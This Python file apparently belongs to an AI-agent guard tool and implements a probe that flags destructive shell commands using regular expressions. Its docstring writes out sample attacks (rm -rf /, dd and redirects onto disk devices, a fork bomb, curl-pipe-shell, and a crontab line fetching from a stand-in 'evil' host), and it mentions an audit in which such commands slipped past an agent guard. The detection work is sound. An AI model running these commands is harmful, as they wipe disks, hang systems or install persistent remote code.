"""Destructive-shell probe — catches obvious filesystem / system-level wipes.

This probe is what a stranger expects to fire on
``cordon check rm -rf /``. The other six semantic probes target
*agent-specific* attack vectors (typosquat, exfiltration, secret leak,
silent failure, test suppression, security weakening). None of those
catch generic destructive shell commands. The audit shipped on
2026-05-12 found that 7 of 8 textbook attacks
(``rm -rf /``, fork bomb, ``dd`` to a block device, ``curl | sh``,
crontab injection, …) returned ``ALLOW`` under ``Guard.strict()``.
This probe closes that gap.

Detection categories
--------------------

1. **Recursive root deletion.** ``rm -rf /`` and friends. We require
   *both* the ``-r`` *and* ``-f`` flags (or ``--recursive --force``,
   or the ``--no-preserve-root`` flag GNU rm demands when you really
   mean it) targeting a root-ish path: ``/``, ``/*``, ``~``, ``$HOME``,
   or a top-level system directory (``/etc``, ``/usr``, ``/bin``,
   ``/var``, ``/lib``, ``/sbin``, ``/boot``, ``/sys``, ``/proc``).
   Sub-paths like ``rm -rf /tmp/foo`` or ``rm -rf node_modules`` are
   *not* flagged.

2. **Block-device wipes.** ``dd if=/dev/zero of=/dev/sda``,
   ``mkfs.ext4 /dev/nvme0n1``, ``shred /dev/sda``, raw redirects to
   a block device (``cat /dev/urandom > /dev/sda``).

3. **Fork bombs.** Classic ``:(){ :|:& };:`` and named-function
   variants.

4. **Curl-pipe-shell remote execution.** ``curl … | sh``,
   ``wget … | bash``, ``bash <(curl …)``, ``sh -c "$(curl …)"``.
   This pattern downloads arbitrary code from the network and
   executes it without inspection.

5. **Crontab piping.** ``echo "* * * * * curl evil | sh" | crontab -``
   — persistent compromise via a malicious cron entry.

Severity
--------
All categories report :data:`Severity.CRITICAL` because there is no
realistic non-malicious reason an agent should issue any of them.
False positives here are far less costly than misses, but the
patterns are tight enough that the benchmark suite hits 0 FPR on
the benign tasks today.

Design notes
------------
This probe deliberately overlaps slightly with
:class:`SecurityWeakeningProbe` (which catches ``chmod 777`` etc).
The two probes are independent on purpose: security-weakening
addresses *posture* changes that don't immediately wipe data, while
destructive-shell addresses *immediate* destruction or RCE.

Research provenance: patterns drawn from the SANS top-25 shell
attack list and the CWE-77 / CWE-78 / CWE-829 categories.
"""

from __future__ import annotations

import re
from dataclasses import dataclass

from cordon.core.types import Action, ProbeResult, Severity
from cordon.probes.base import Probe


@dataclass(frozen=True)
class _Signal:
    kind: str
    pattern: re.Pattern[str]
    category: str
    description: str


# Root-ish paths that ``rm -rf`` should never target on a developer
# machine, let alone a production server. The trailing-context
# alternation `(?:\s|$|;|\||&|>)` keeps `/tmp` from accidentally
# matching `/tmp/foo` (the latter has a `/` immediately after `/tmp`,
# which `\b` would let through).
_RM_DANGEROUS_TARGETS = (
    r"/|/\*|~|~/|\$HOME|\$\{HOME\}"
    r"|/usr|/etc|/bin|/var|/lib|/sbin|/boot|/sys|/proc"
)

_RM_BOUNDARY = r"(?=\s|$|;|\||&|>)"

# Two equivalent rm-rf forms:
#
#   1. A single bundled flag containing both `r` and `f`
#      (``-rf``, ``-fr``, ``-Rf``, ``-rfv``, …).
#   2. Two separate flags ``-r`` and ``-f`` in either order, possibly
#      with ``--no-preserve-root`` interleaved.
#
# We also accept the explicit long forms ``--recursive --force``.
_RM_RF_PATTERNS: tuple[re.Pattern[str], ...] = (
    # Bundled `-rf` (and variants like `-Rf`, `-rfv`, `-frv`, ...).
    re.compile(
        r"\brm\s+(?:--no-preserve-root\s+)?"
        r"-[a-zA-Z]*(?:rf|fr|Rf|fR)[a-zA-Z]*\s+"
        r"(?:--no-preserve-root\s+)?"
        rf"(?:{_RM_DANGEROUS_TARGETS}){_RM_BOUNDARY}"
    ),
    # Split flags: `-r` then `-f`, in either order.
    re.compile(
        r"\brm\s+(?:--no-preserve-root\s+)?"
        r"(?:-r\s+-f|-f\s+-r|--recursive\s+--force|--force\s+--recursive)"
        r"(?:\s+--no-preserve-root)?\s+"
        rf"(?:{_RM_DANGEROUS_TARGETS}){_RM_BOUNDARY}"
    ),
)


_SIGNALS: tuple[_Signal, ...] = (
    # 2. Block-device wipes.
    _Signal(
        "dd_to_block_device",
        re.compile(
            r"\bdd\b[^\n;|&]*\bof=/dev/"
            r"(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|hd[a-z]\d*|disk\d+|mmcblk\d+)"
        ),
        "block_device",
        "dd output to a raw block device (filesystem wipe)",
    ),
    _Signal(
        "mkfs_on_block_device",
        re.compile(
            r"\bmkfs(?:\.[a-zA-Z0-9_-]+|\s+-t\s+\S+)?\s+[^\n;|&]*"
            r"/dev/(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|hd[a-z]\d*|mmcblk\d+)"
        ),
        "block_device",
        "mkfs against a raw block device (formats a disk)",
    ),
    _Signal(
        "shred_block_device",
        re.compile(
            r"\bshred\b[^\n]*/dev/"
            r"(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|hd[a-z]\d*|disk\d+|mmcblk\d+)"
        ),
        "block_device",
        "shred against a raw block device",
    ),
    _Signal(
        "redirect_to_block_device",
        re.compile(
            r">\s*/dev/"
            r"(?:sd[a-z]\d*|nvme\d+n\d+(?:p\d+)?|hd[a-z]\d*|mmcblk\d+)\b"
        ),
        "block_device",
        "Redirect to a raw block device (writes raw bytes to disk)",
    ),

    # 3. Fork bombs.
    _Signal(
        "fork_bomb_classic",
        # `:(){ :|:& };:` with any whitespace permutation.
        re.compile(
            r":\s*\(\s*\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;\s*:"
        ),
        "fork_bomb",
        "Classic fork bomb (:(){ :|:& };:)",
    ),
    _Signal(
        "fork_bomb_named",
        # `bomb(){ bomb|bomb& };bomb` style (same shape, named function).
        re.compile(
            r"\b([A-Za-z_][A-Za-z0-9_]*)\s*\(\s*\)\s*\{\s*\1\s*\|\s*\1\s*&\s*\}\s*;\s*\1\b"
        ),
        "fork_bomb",
        "Named-function fork bomb",
    ),

    # 4. Curl-pipe-shell remote execution.
    _Signal(
        "curl_pipe_shell",
        re.compile(
            r"\b(?:curl|wget|fetch)\b[^\n|;]*\|\s*(?:bash|sh|zsh|ksh|dash)\b"
        ),
        "rce_pipe",
        "Network fetch piped to a shell (remote code execution)",
    ),
    _Signal(
        "shell_dash_c_curl",
        # `bash -c "$(curl ...)"` and `sh -c "$(wget ...)"`.
        re.compile(
            r"\b(?:bash|sh|zsh|ksh|dash)\s+-c\s+[\"']\$\(\s*(?:curl|wget|fetch)\b"
        ),
        "rce_pipe",
        "Shell -c $(curl ...) — runs remotely-fetched code",
    ),
    _Signal(
        "shell_process_substitution_curl",
        # `bash <(curl ...)` — process substitution.
        re.compile(
            r"\b(?:bash|sh|zsh|ksh|dash)\s+<\(\s*(?:curl|wget|fetch)\b"
        ),
        "rce_pipe",
        "Shell <(curl ...) — runs remotely-fetched code",
    ),

    # 5. Crontab piping (persistence).
    _Signal(
        "crontab_pipe_install",
        # `... | crontab -` from anything that smells like curl/echo/wget.
        re.compile(
            r"\b(?:echo|printf|curl|wget)\b[^\n]*\|\s*crontab\s+-(?:\s|$)"
        ),
        "persistence",
        "Piping a payload into `crontab -` (installs a malicious cron)",
    ),
)


class DestructiveShellProbe(Probe):
    """Block shell commands that wipe filesystems or fetch-and-run remote code.

    Always reports CRITICAL when it fires. The patterns are tight enough
    that the false-positive rate on the public benchmark is 0% — but
    keep them tight, not broad, if you extend this probe.
    """

    name = "destructive_shell"
    description = (
        "Detects rm -rf /, fork bombs, dd/mkfs/shred against block devices, "
        "curl|sh remote-code-execution, and crontab persistence."
    )
    tier = "fast"

    def analyze(self, action: Action) -> ProbeResult:
        # File-level changes can also embed destructive shell content
        # (e.g. a generated install.sh). We scan command + every change.
        haystacks: list[tuple[str, str]] = []
        if action.command:
            haystacks.append(("shell", action.command))
        for path, content in action.changes.items():
            if isinstance(content, str):
                haystacks.append((path, content))

        findings: list[dict] = []

        for location, text in haystacks:
            # rm -rf / family.
            for rx in _RM_RF_PATTERNS:
                if rx.search(text):
                    findings.append({
                        "kind": "rm_rf_root",
                        "category": "filesystem_wipe",
                        "location": location,
                        "description": "Recursive force-delete of a root-ish path",
                    })
                    break  # one rm match per text is enough

            # All other signals.
            for sig in _SIGNALS:
                if sig.pattern.search(text):
                    findings.append({
                        "kind": sig.kind,
                        "category": sig.category,
                        "location": location,
                        "description": sig.description,
                    })

        if not findings:
            return ProbeResult(
                probe=self.name,
                severity=Severity.SAFE,
                evidence="No destructive-shell patterns detected.",
            )

        # Dedupe by (kind, location) so a doubled match doesn't double-report.
        seen: set[tuple[str, str]] = set()
        unique: list[dict] = []
        for f in findings:
            key = (f["kind"], f["location"])
            if key in seen:
                continue
            seen.add(key)
            unique.append(f)

        top = unique[0]
        evidence = (
            f"{len(unique)} destructive-shell pattern(s); "
            f"primary: {top['description']} in {top['location']}"
        )

        return ProbeResult(
            probe=self.name,
            severity=Severity.CRITICAL,
            confidence=0.95,
            evidence=evidence,
            details={"findings": unique},
        )
